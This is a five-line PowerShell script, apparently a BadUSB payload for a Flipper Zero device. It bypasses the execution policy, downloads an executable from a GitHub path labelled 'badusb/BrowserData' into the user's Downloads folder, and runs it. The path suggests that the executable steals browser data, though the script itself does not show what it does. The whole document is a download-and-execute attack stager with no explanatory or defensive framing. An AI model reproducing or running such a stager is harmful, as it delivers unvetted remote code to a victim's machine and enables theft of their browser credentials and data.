Set-ExecutionPolicy Bypass -Scope Process -Force
$url="https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/windows64.exe"
$destination=[System.IO.Path]::Combine($env:UserProfile, 'Downloads', 'windows64.exe')
Invoke-WebRequest -Uri $url -OutFile $destination
Start-Process -FilePath $destination -Wait